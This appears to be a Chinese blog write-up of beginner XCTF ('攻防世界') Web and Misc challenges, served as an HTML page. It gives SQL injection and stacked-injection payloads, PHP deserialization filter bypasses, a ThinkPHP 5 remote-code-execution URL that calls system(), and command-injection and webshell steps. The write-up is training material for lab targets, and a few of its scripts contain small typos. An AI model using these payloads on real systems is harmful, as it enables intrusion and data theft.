<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>攻防世界 | 0opsdc</title><meta name=keywords content="CTF"><meta name=description content="攻防世界 Web view source Des：X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。
查看页面源码。
获得flag。
robots Des：X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。
在URL后加上robots.txt，得到一个php页面提示，访问对应php文件。
获得flag。
backup Des：X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！
尝试backup.php，无效。
使用御剑扫描后台，得到index.php.bak，输入后下载备份文件，cat查看。
获得flag。
cookie Des：X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想:‘这是夹心饼干的意思吗？’
使用burp抓包，得到cookie.php。
继续使用burp抓包，查看Response。
获得flag。
disable_button Des：N/A。
页面的flag按钮无响应，猜测被禁用，查看控制台元素。
<input class=&#34;btn btn-default&#34; disabled> 将此处的disabled前三字符删除，改为abled，按下按钮。
获得flag。
weak_auth Des：小宁写了一个登陆验证页面，随手就设了一个密码。
查看源码。
<from class=&#34;form-inline&#34; method=&#34;post&#34; action=&#34;./check.php&#34;> 有一个验证页面，访问它。
页面空白，查看源码，提示。
<!--maybe you need a dictionary--> 这道题或许不需要字典？
尝试御剑扫描，无果。
好的我错了，随机输入用户名和密码，使用burp抓包，response显示用户名必须为admin，初次爆破无果，手动尝试123456，正确&mldr;.如果尝试继续用字典的话还是可以爆出来，只是比较费时间。
获得flag。
simple_php Des：小宁听说php是最好的语言，于是她简单学习之后写了几行php代码。
<?php show_source(__FILE__); include(&#34;config.php&#34;); $a = @$_GET['a']; $b = @$_GET['b']; if ($a == 0 and $a) { echo $flag1; } if (is_numeric($b)) { exit(); } if ($b > 1234) { echo $flag2; } ?"><meta name=author content="0opsdc"><link rel=canonical href=https://oopsdc.com/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/><link crossorigin=anonymous href=/assets/css/stylesheet.56b5cc8c8054cf5f30eac4b81af2021f829171098f6e116bb016ed77e3264a36.css integrity="sha256-VrXMjIBUz18w6sS4GvICH4KRcQmPbhFrsBbtd+MmSjY=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png><link rel=icon type=image/png sizes=16x16 href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png><link rel=icon type=image/png sizes=32x32 href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png><link rel=apple-touch-icon href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png><link rel=mask-icon href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="攻防世界"><meta property="og:description" content="攻防世界 Web view source Des：X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。
查看页面源码。
获得flag。
robots Des：X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。
在URL后加上robots.txt，得到一个php页面提示，访问对应php文件。
获得flag。
backup Des：X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！
尝试backup.php，无效。
使用御剑扫描后台，得到index.php.bak，输入后下载备份文件，cat查看。
获得flag。
cookie Des：X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想:‘这是夹心饼干的意思吗？’
使用burp抓包，得到cookie.php。
继续使用burp抓包，查看Response。
获得flag。
disable_button Des：N/A。
页面的flag按钮无响应，猜测被禁用，查看控制台元素。
<input class=&#34;btn btn-default&#34; disabled> 将此处的disabled前三字符删除，改为abled，按下按钮。
获得flag。
weak_auth Des：小宁写了一个登陆验证页面，随手就设了一个密码。
查看源码。
<from class=&#34;form-inline&#34; method=&#34;post&#34; action=&#34;./check.php&#34;> 有一个验证页面，访问它。
页面空白，查看源码，提示。
<!--maybe you need a dictionary--> 这道题或许不需要字典？
尝试御剑扫描，无果。
好的我错了，随机输入用户名和密码，使用burp抓包，response显示用户名必须为admin，初次爆破无果，手动尝试123456，正确&mldr;.如果尝试继续用字典的话还是可以爆出来，只是比较费时间。
获得flag。
simple_php Des：小宁听说php是最好的语言，于是她简单学习之后写了几行php代码。
<?php show_source(__FILE__); include(&#34;config.php&#34;); $a = @$_GET['a']; $b = @$_GET['b']; if ($a == 0 and $a) { echo $flag1; } if (is_numeric($b)) { exit(); } if ($b > 1234) { echo $flag2; } ?"><meta property="og:type" content="article"><meta property="og:url" content="https://oopsdc.com/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"><meta property="og:image" content="https://oopsdc.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="post"><meta property="article:published_time" content="2020-01-03T22:06:50+08:00"><meta property="article:modified_time" content="2020-01-03T22:06:50+08:00"><meta property="og:site_name" content="0opsdc"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://oopsdc.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="攻防世界"><meta name=twitter:description content="攻防世界 Web view source Des：X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。
查看页面源码。
获得flag。
robots Des：X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。
在URL后加上robots.txt，得到一个php页面提示，访问对应php文件。
获得flag。
backup Des：X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！
尝试backup.php，无效。
使用御剑扫描后台，得到index.php.bak，输入后下载备份文件，cat查看。
获得flag。
cookie Des：X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想:‘这是夹心饼干的意思吗？’
使用burp抓包，得到cookie.php。
继续使用burp抓包，查看Response。
获得flag。
disable_button Des：N/A。
页面的flag按钮无响应，猜测被禁用，查看控制台元素。
<input class=&#34;btn btn-default&#34; disabled> 将此处的disabled前三字符删除，改为abled，按下按钮。
获得flag。
weak_auth Des：小宁写了一个登陆验证页面，随手就设了一个密码。
查看源码。
<from class=&#34;form-inline&#34; method=&#34;post&#34; action=&#34;./check.php&#34;> 有一个验证页面，访问它。
页面空白，查看源码，提示。
<!--maybe you need a dictionary--> 这道题或许不需要字典？
尝试御剑扫描，无果。
好的我错了，随机输入用户名和密码，使用burp抓包，response显示用户名必须为admin，初次爆破无果，手动尝试123456，正确&mldr;.如果尝试继续用字典的话还是可以爆出来，只是比较费时间。
获得flag。
simple_php Des：小宁听说php是最好的语言，于是她简单学习之后写了几行php代码。
<?php show_source(__FILE__); include(&#34;config.php&#34;); $a = @$_GET['a']; $b = @$_GET['b']; if ($a == 0 and $a) { echo $flag1; } if (is_numeric($b)) { exit(); } if ($b > 1234) { echo $flag2; } ?"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://oopsdc.com/post/"},{"@type":"ListItem","position":2,"name":"攻防世界","item":"https://oopsdc.com/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"攻防世界","name":"攻防世界","description":"攻防世界 Web view source Des：X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。\n查看页面源码。\n获得flag。\nrobots Des：X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。\n在URL后加上robots.txt，得到一个php页面提示，访问对应php文件。\n获得flag。\nbackup Des：X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！\n尝试backup.php，无效。\n使用御剑扫描后台，得到index.php.bak，输入后下载备份文件，cat查看。\n获得flag。\ncookie Des：X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想:‘这是夹心饼干的意思吗？’\n使用burp抓包，得到cookie.php。\n继续使用burp抓包，查看Response。\n获得flag。\ndisable_button Des：N/A。\n页面的flag按钮无响应，猜测被禁用，查看控制台元素。\n\u0026lt;input class=\u0026#34;btn btn-default\u0026#34; disabled\u0026gt; 将此处的disabled前三字符删除，改为abled，按下按钮。\n获得flag。\nweak_auth Des：小宁写了一个登陆验证页面，随手就设了一个密码。\n查看源码。\n\u0026lt;from class=\u0026#34;form-inline\u0026#34; method=\u0026#34;post\u0026#34; action=\u0026#34;./check.php\u0026#34;\u0026gt; 有一个验证页面，访问它。\n页面空白，查看源码，提示。\n\u0026lt;!--maybe you need a dictionary--\u0026gt; 这道题或许不需要字典？\n尝试御剑扫描，无果。\n好的我错了，随机输入用户名和密码，使用burp抓包，response显示用户名必须为admin，初次爆破无果，手动尝试123456，正确\u0026hellip;.如果尝试继续用字典的话还是可以爆出来，只是比较费时间。\n获得flag。\nsimple_php Des：小宁听说php是最好的语言，于是她简单学习之后写了几行php代码。\n\u0026lt;?php show_source(__FILE__); include(\u0026#34;config.php\u0026#34;); $a = @$_GET[\u0026#39;a\u0026#39;]; $b = @$_GET[\u0026#39;b\u0026#39;]; if ($a == 0 and $a) { echo $flag1; } if (is_numeric($b)) { exit(); } if ($b \u0026gt; 1234) { echo $flag2; } ?","keywords":["CTF"],"articleBody":"攻防世界 Web view source Des：X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。\n查看页面源码。\n获得flag。\nrobots Des：X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。\n在URL后加上robots.txt，得到一个php页面提示，访问对应php文件。\n获得flag。\nbackup Des：X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！\n尝试backup.php，无效。\n使用御剑扫描后台，得到index.php.bak，输入后下载备份文件，cat查看。\n获得flag。\ncookie Des：X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想:‘这是夹心饼干的意思吗？’\n使用burp抓包，得到cookie.php。\n继续使用burp抓包，查看Response。\n获得flag。\ndisable_button Des：N/A。\n页面的flag按钮无响应，猜测被禁用，查看控制台元素。\n\u003cinput class=\"btn btn-default\" disabled\u003e 将此处的disabled前三字符删除，改为abled，按下按钮。\n获得flag。\nweak_auth Des：小宁写了一个登陆验证页面，随手就设了一个密码。\n查看源码。\n\u003cfrom class=\"form-inline\" method=\"post\" action=\"./check.php\"\u003e 有一个验证页面，访问它。\n页面空白，查看源码，提示。\n这道题或许不需要字典？\n尝试御剑扫描，无果。\n好的我错了，随机输入用户名和密码，使用burp抓包，response显示用户名必须为admin，初次爆破无果，手动尝试123456，正确….如果尝试继续用字典的话还是可以爆出来，只是比较费时间。\n获得flag。\nsimple_php Des：小宁听说php是最好的语言，于是她简单学习之后写了几行php代码。\n\u003c?php show_source(__FILE__); include(\"config.php\"); $a = @$_GET['a']; $b = @$_GET['b']; if ($a == 0 and $a) { echo $flag1; } if (is_numeric($b)) { exit(); } if ($b \u003e 1234) { echo $flag2; } ?\u003e 包含文件config.php，查看源码，无隐藏信息。\n页面通过GET传参，根据条件a=0且a为真，b不能为数字且大于1234，添加?a=0e1\u0026b=12346s，获得flag。\nget_post Des：X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？\n跟着提示走，URL后添加?a=1。\nhackbar进行POST传参。\n获得flag。\nxff_referer Des：X老师告诉小宁其实xff和referer是可以伪造的。\nX-Forwarded-For: 123.123.123.123 burp抓包，在Request添加：\nReferer: https://www.google.com 查看Response。\n获得flag。\nwebshell Des：小宁百度了php一句话,觉着很有意思,并且把它放在index.php里。\n御剑扫描后台，没用…\n查了一下资料，需要其他工具，选择中国蚁剑。\n配好之后添加题目网址，输入密码：shell。\n点击进入，查看flag.txt。\n获得flag。\ncomman_execution Des：小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。\n给出一个ping窗口，尝试本地回环。\n命令可以正常执行，尝试拼接。\n可以正常执行拼接命令，查看当前目录所有文件\n没用，而且只能在当前目录执行命令，尝试搜索当前用户所有txt文档。\n发现flag，根据路径使用cat命令查看flag.txt。\n获得flag。\nsimple_js Des：小宁发现了一个网页，但却一直输不对密码。\nX-Forwarded-For: 220.249.52.133 要求输入密码，随机输入后显示错误，查看网页源码：\n\u003chtml\u003e \u003chead\u003e \u003ctitle\u003eJS\u003c/title\u003e \u003cscript type=\"text/javascript\"\u003e function dechiffre(pass_enc) { var pass = \"70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65\"; var tab = pass_enc.split(','); var tab2 = pass.split(','); var i,j,k,l = 0,m,n,o,p = \"\"; i = 0; j = tab.length; k = j + (l) + (n=0); n = tab2.length; for (i = (o=0); i \u003c (k = j = n); i++) { o = tab[i-l]; p += String.fromCharCode((o = tab2[i])); if(i == 5) break; } for (i = (o=0); i \u003c (k = j = n); i++) { o = tab[i-l]; if (i \u003e 5 \u0026\u0026 i \u003c k-1) p += String.fromCharCode((o = tab2[i])); } p += String.fromCharCode(tab2[17]); pass = p; return pass; } String[\"fromCharCode\"](dechiffre(\"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\")); h = window.prompt('Enter password'); alert(dechiffre(h)); \u003c/script\u003e \u003c/head\u003e \u003c/html\u003e 代码审计，加了很多不必要的代码，将fromCharCode字符串中的十六进制转文本，得到55,56,54,79,115,69,114,116,107,49,50，写一个python脚本返回整数所对应的Unicode字符：\ns = [55,56,54,79,115,69,114,116,107,49,50] for i in s: print(chr(i), end='') 将输出结果加上给定flag格式。\n获得flag。\nNewsCenter Des：N/A。\n只给了一个输入框，源码无提示。\n尝试查看是否存在SQL注入，依次输入1、2、3、4，到4时页面无回显，初步判断存在。继续尝试注入语句，发现页面会无法处理请求，发现需要把前面的语句先闭合再进行注入。\n爆表：\n'and -1 union select 1,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.TABLES# 最下面有一个secret_table，这里面应该就是我们需要的信息。\n爆列：\n'and -1 union select 1,COLUMN_NAME,DATA_TYPE from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME='secret_table'# 得到两个表：\nid\rfl4g 爆字段：\n'and -1 union select 1,2,fl4g from secret_table# Web进阶 baby_web Des：想想初始页面是哪个。\n页面为1.php。\ndirb扫描目录，初始页面被重定向到1.php。\n尝试访问index.php，在控制台查看访问记录。\n获得flag。\nTraining-WWW-Robots Des：N/A。\n访问robots.txt。\n访问fl0g.php。\n获得flag。\nunserialize3 Des：N/A。\nPHP__wakeup()函数漏洞\n在程序执行前，serialize()函数会首先检查是否存在一个魔术方法_sleep()，如果存在，_sleep()方法会先被调用， 然后才执行序列化操作。这个功能可以用于清理对象并返回一个包含对象中所有变量名称的数组。如果该方法不返回任何内容，则NULL被序列化，导致一个E_NOTICE错误。与之相反，unserialize()会检查是否存在一个wakeup方法。如果存在，则会先调用__wakeup方法，预先准备对象数据。但是这个__wakeup()是可以被绕过的。\n__wakeup触发于unserilize() 调用之前，当反序列化时的字符串所对应的对象的数目被修改，wake 的函数就不会被调用且不会重建为对象，但是会触发其他的魔术方法。\n本题使用code进行传参，利用__wakeup函数漏洞，当序列化字符串表示对象属性个数的值大于真实个数属性时就会跳过__wakeup的执行。\n先用php脚本跑出序列化字符串：\n\u003c?php class xctf { public $flag = '111'; public function __wakeup() { exit('bad requests'); } } $c = new xctf(); print(serialize($c)); ?\u003e 结果:\nO:4:\"xctf\":1:{s:4:\"flag\";s:3:\"111\";} 将上述结果赋给code参数。\n获得flag。\nWeb php unserialize Des：N/A。\n\u003c?php class Demo { private $file = 'index.php'; public function __construct($file) { $this-\u003efile = $file; } function __destruct() { echo @highlight_file($this-\u003efile, true); } function __wakeup() { if ($this-\u003efile != 'index.php') { //the secret is in the fl4g.php $this-\u003efile = 'index.php'; } } } if (isset($_GET['var'])) { $var = base64_decode($_GET['var']); if (preg_match('/[oc]:\\d+:/i', $var)) { die('stop hacking!'); } else { @unserialize($var); } } else { highlight_file(\"index.php\"); } ?\u003e 简单写个php脚本：\n\u003c?php class Demo { private $file = 'index.php'; public function __construct($file) { $this-\u003efile = $file; } function __destruct() { echo @highlight_file($this-\u003efile, true); } function __wakeup() { if ($this-\u003efile != 'index.php') { // the secret is in the fl4g.php $this-\u003efile = 'index.php'; } } } $tmp = new Demo('fl4g.php'); $res = serialize($tmp); // O:4:\"Demo\":1:{s:10:\"Demofile\";s:8:\"fl4g.php\";} $res = str_replace('O:4', 'O:+4', $res);\t// 绕过preg_match() $res = str_replace(':1:', ':2:', $res);\t// 绕过__wakeup() var_dump($res); // \"O:+4:\"Demo\":1:{s:10:\"Demofile\";s:8:\"fl4g.php\";} var_dump(base64_encode(res)); // TzorNDoiRGVtbyI6Mjp7czoxMdoiAERlbW8AZmlsZSI7czo40iJmbDRnLnBocCI7fQ== ?\u003e 给变量var传参TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==。\n获得flag。\nphp rce Des：N/A。\n查看控制台元素，无有用信息。\n御剑扫描后台，发现robots.txt。\n根据题目名称搜索Think PHP V5 rce漏洞\n发现补丁修改后的代码：\n$controller = strp_tags($result[1] ?: $config['default_controller']); if (!preg_match('/^[A-Za-z](\\w)*$/', $controller)) { throw new HttpException(404, 'controller not exists:' . $controller); } 从$controller分析，补丁对其名称进行了过滤，继续查看：\ntry { $instance = Loader::controller( $controller, $config['url_controller_layer'], $config['controller_suffix'], $config['empty_controller'] ); } 代码对controller进行了实例化，进入到Loader部分查看：\npublic static function controller($name, $layer='controller', $appendSuffix=false, $empty='') { list($module, $class) = self::getModuleAndClass($name, $layer, $appendSuffix); if (class_exists($class)) { return App::invokeClass($class); } if ($empty) { $emptyClass = self::parseClass($module, $layer, $empty, $appendSuffix); if (class_exists($emptyClass)) { return new $emptyClass(Request::instance()); } } } 如果类name存在，进行实例化，并跟进getModuleAndClass：\nprotected static function getModuleAndClass($name, $layer, $appendSuffix) { if (false != strpos($name, '\\\\')) { $module = Request::instance()-\u003emodule(); $class = $name; } else { if (strpos($name, '/')) { list($module, $name) = explode('/', $name, 2); } else { $module = Request::instance()-\u003emodule(); } $class = self::parseClass($module, $layer, $name, $appendSuffix); } return [$module, $class]; } 此函数将module和class返回，用于实例化，利用命名空间的特点，如果能够控制此处的class，即补丁内的controller，就可以实例化任何类。若将控制器设置为\\think\\App，可以构造payload调用其方法invokeFunction：\npublic static function invokeFunction($function, $var = []) { $reflect = new \\ReflectionFunction($function); $args = self::bindParams($reflect, $vars); // 记录执行信息 self::$debug \u0026\u0026 Log::record('[RUN]' . $reflect-\u003e__toString(), 'info'); return $reflect-\u003einvokeArgs($args); } \\think\\App/invokefunction\u0026function=call_user_func_array\u0026vars[0]=system\u0026vars[1][]=dir 接下来设置controller为\\think\\App：\n$controller = strp_tags($result[1] ?: $config['default_controller']); 把result[1]的值传递到$controller中：\npublic static function module($result, $config, $convert=null) 寻找使用module的位置：\nprotected static function exec($dispatch, $config) { ... $data = self::module( $dispatch['module'], $config, isset($dispatch['convert'] ? $dispatch['convert'] : null) ); ... } $result来自$dispatch['module']，往前看：\npublic static function run(Request $request=null) { ... $dispatch = self::dispatch; if (empty($dispatch)) { $dispatch = self::routeCheck($request, $config); } ... $data = self::exec($dispatch, $config); ... } 跟踪routeCheck：\npublic static function routeCheck($request, array $config) { ... result = Route::check($request, $path, $depr, $config['url_domain_deploy']) ... } 发现解析URL并未进行安全检测。\n从Request::path()跟踪到pathinfo()：\npublic function pathinfo() { if (is_null($this-\u003epathinfo)) { if (isset($_GET[Config::get('var_pathinfo')])) { // 判断URL是否含有兼容模式参数 $_SERVER['PATH_INFO'] = $_GET[Config::get('var_pathinfo')]; unset($_GET[Config::get('var_pathinfo')]); } elseif (IS_CLI) { // CLI模式下 index.php module/controller/action/params/... $_SERVER['PATH_INFO'] = isset($_SERVER['argv'][1]) ? $_SERVER['argv'][1] : ''; } // 分析 PATHINFO 信息 if (!isset($_SERVER['PATH_INFO'])) { foreach (Config::get('pathinfo_fetch') as $type) { if (!empty($_SERVER[$type])) { $_SERVER['PATH_INFO'] = (0 == strops($_SERVER[$type], $_SERVER['SCRIP_NAME'])) ? substr($_SERVER[$type], strlen($_SERVER['SCRIPT_NAME'])) : $_SERVER[$type]; break; } } } $this-\u003epathinfo = empty($_SERVER['PATH_INFO']) ? '/' : ltrim($_SERVER['PATH_INFO'], '/'); } return $this-\u003epathinfo; } var_info默认配置为s，可以通过$_GET['s']进行传参\n构造payload：\n?s=index/\\think\\App/invokefunction\u0026function=call_user_func_array\u0026vars[0]=system\u0026vars[1][]=dir 获得flag。\nsupersqli Des：随便注。\n看源码。\n\u003chtml\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003ctitle\u003eeasy_sql\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003ch1\u003e 取材于某次真实环境渗透，只说一句话:开发和安全缺一不可 \u003c/h1\u003e \u003cform method=\"get\"\u003e 姿势:\u003cinput type=\"text\" name=\"inject\" value=\"1\"\u003e \u003cinput type=\"submit\" \u003c/form\u003e \u003cpre\u003e\u003c/pre\u003e \u003c/body\u003e \u003c/html\u003e 有过滤。\n可以堆叠注入。\nflag在1919810931114514这个表里面。查询表数据的方法有两种:1.页面默认查询的是words表，需要将这两个表名互换；2.利用MySQL的预处理进行查询。\n1';use supersql;set @sql=concat('s', 'elect * from `1919810931114514`');PREPARE pre FROM @sql;EXECUTE pre;--+ 知识点：\n1.MySQL表名为纯数字(或表名和保留字冲突时)，要加反引号，如：\nshow columns from `1919810931114514` 2.MySQL官方将prepare、execute、deallocate统称为预处理语句。\n3.字符拼接函数可以绕过关键字检查，如这里利用的concat。\nMisc reverseMe Des：N/A。\n给了一张图片:\n放进ps翻转图片即可。\n获得flag。\nthis_is_flag Des：Most flags are in the form flag{xxx}, for example:flag{th1s_!s_a_d4m0_4la9}。\n获得flag。\npdf Des：菜猫给了菜狗一张图，说图下面什么都没有。\n给了一个pdf文件，用binwalk看看。\n啥也没有，再用Acrobat软件查看pdf。\n诶，发现图片后面还有一个文本框，尝试把图片拖到一旁。\n获得flag。\ngive_you_flag Des：菜狗找到了文件中的彩蛋很开心，给菜猫发了个表情包。\n给了一个gif图片，查看后发现最后一针有一个二维码，用StegSolve逐帧看看。\n得到这一帧图片，发现缺少二维码定位点，尝试自己画上去。\n扫描二维码。\n获得flag。\ngif Des：菜狗截获了一张菜鸡发给菜猫的动态图，却发现另有玄机。\n解压压缩包后获得104张图片，只有黑白两种颜色，猜测分别表示1和0？\n01100110 01101100 01100001 01100111 01111011 01000110 01110101 01001110 01011111 01100111 01101001 01000110 01111101\n然后通过python脚本转换一下：\nx = [0b01100110, 0b01101100, 0b01100001, 0b01100111, 0b01111011, 0b01000110, 0b01110101, 0b01001110, 0b01011111, 0b01100111, 0b01101001, 0b01000110, 0b01111101] flag = '' for i in x: flag += chr(i) print(flag) 获得flag。\n掀桌子 Des：菜狗截获了一份报文如下c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2，生气地掀翻了桌子(╯°□°）╯︵ ┻━┻。\n分析给出的字符串，由0-9，a-f组成，两两分组转换成字节后均大于128，而ASCII码范围为0-127，将其减去128，python代码如下：\nx = '\\xc8\\xe9\\xac\\xa0\\xc6\\xf2\\xe5\\xf3\\xe8\\xc4\\xef\\xe7\\xa1\\xa0\\xd4\\xe8\\xe5\\xa0\\xe6\\xec\\xe1\\xe7\\xa0\\xe9\\xf3\\xba\\xa0\\xe8\\xea\\xfa\\xe3\\xf9\\xe4\\xea\\xfa\\xe2\\xea\\xe4\\xe3\\xea\\xeb\\xfa\\xeb\\xe3\\xf5\\xe7\\xe9\\xf3\\xe4\\xe3\\xe8\\xea\\xf9\\xea\\xf3\\xe2\\xe4\\xe6\\xf2' falg = '' for i in x: flag += chr(ord(i)-128) print(flag) 获得flag。\n如来十三掌 Des：菜狗为了打败菜猫，学了一套如来十三掌。\n给了一个docx文档，用binwalk查看一下信息。\n使用命令binwalk -e分离文件。\n然后再怎么找也找不到路子做题，看了下wp，佛了。\n要用到与佛论禅进行解密。\n获得一串字符串，有点像Base64，但是解码后是乱码，想想题目，十三，尝试一下rot13。\n然后再进行Base64解码。\n获得flag。\nSimpleRAR Des：菜狗最近学会了拼图，这是他刚拼好的，可是却搞错了一块(ps:双图层)。\n只给了文件flag.txt。\n可是除了这个文件啥也没有了呀…\n用WinRAR打开压缩包试试（别问为什么，问就是套路）。\n上WinHex查看数据。\nhere之后的数据应该就是那张图片了，搜索一下rar每个块的文件头：0x74。\n将高亮处改为74，保存。图片出来了。\n一片纯白，按提示用ps查看图层，但显示打开错误…用binwalk看看这是什么。\n改后缀为.gif，再尝试打开。\n只有两个空白图层，将它们分别保存后用StegSolve看看。\n图层1。\n图层2。\n两张被分割的二维码，没有定位符…\n唉，拼接吧。本来想用ps的图层，然而学艺不精，丢在word里面拼接之后，再用画图工具弄上定位符。\n获得flag。\n坚持60s Des：菜狗发现最近菜猫不爱理他，反而迷上了菜鸡。\n这…之前做过。\n使用命令binwalk -e分离文件出来，然后切换到分离目录，grep -r \"flag\"。\n用记事本打开包含flag的文档，搜索flag。\n里面的内容是Base64编码，解码后进行提交。\n获得flag。\nbase64stego Des：菜狗经过几天的学习，终于发现了如来十三掌最后一步的精髓。\n题目给的压缩包里有一个加密文件，但是没有密码提示，用WinHex打开压缩包看看。\n伪加密，将高亮处改为00，保存。\n正常打开stego.txt，一大段Base64编码。\n进行Base64解码，获得一串无用字符串Steganography is the art and science of writing hidden messages in such a way that no one。\n是一道Base64隐写，附上python2.7脚本：\ndef get_base64_diff_value(s1, s2): base64chars = 'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890+/' res = 0 for i in xrange(len(s1)): if s1[i] != s2[i]: return abs(base64chars.index(s1[i]) - base64chars.index(s2[i])) return res def solve_stego(): with open('stego.txt', 'rb') as f: file_lines = f.readlines() bin_str = '' for line in file_lines: steg_line = line.replace('\\n', '') norm_line = line.replace('\\n', '').decode('base64').encode('base64').replace('\\n', '') diff = get_base64_diff_value(steg_line, norm_line) pads_num = steg_line.count('=') if diff: bin_str += bin(diff)[2:].zfill(pads_num*2) else: bin_str += '0'*pads_num*2 res_str = '' for i in xrange(0, len(bin_str), 8): res_str += chr(int(bin_str[i:i+8], 2)) print res_str solve_stego() 获得flag。\next3 Des：今天是菜狗的生日，他收到了一个Linux系统光盘。\n给了一个ext文件，是Linux系统文件，尝试挂载一下。此处的wsl kali由于配置环境不够，使用VMware kali虚拟机进行操作。\n挂载：mount f1fc23f5c743425d9e0073887c846d23 /mnt/。\n查找：find 'flag' /mnt/，发现有一个/mnt/O7avZhikgKgbF/flag.txt文件。\n查看：cat /mnt/O7avZhikgKgbF/flag.txt。\nBase64解码。\n获得flag。\nstegano Des：菜狗收到了图后很开心，玩起了pdf提交格式为flag{xxx}，解密字符需小写。\n题目给了一个pdf文件，使用浏览器打开，Ctrl+A选中所有，将文本复制到记事本。\n没有规律，尝试摩斯密码，将A替换为.，B替换为-，python代码附上：\ns = 'BABA BBB BA BBA ABA AB B AAB ABAA AB B AA BBB BA AAA BBAABB AABA ABAA AB BBA BBBAAA ABBBB BA AAAB ABBBB AAAAA ABBBB BAAA ABAA AAABB BB AAABB AAAAA AAAAA AAAAB BBA AAABB' s1 = s.replace('A', '.') s2 = s.replace('B', '-') print(s2) 得到一串摩斯加密，摩尔斯电码转换器：在线进行摩尔斯电码和英文字母的相互转换，可以把莫尔斯电码转换为英文字母，也可把英文字母转换为摩尔斯电码 (zhongguosou.com)，因为其他网站不是解不出来就是乱码…然后对得到的字符串进行小写处理，python脚本：\ns = 'FLAG1NV151BL3M3554G3' print(s.lower()) 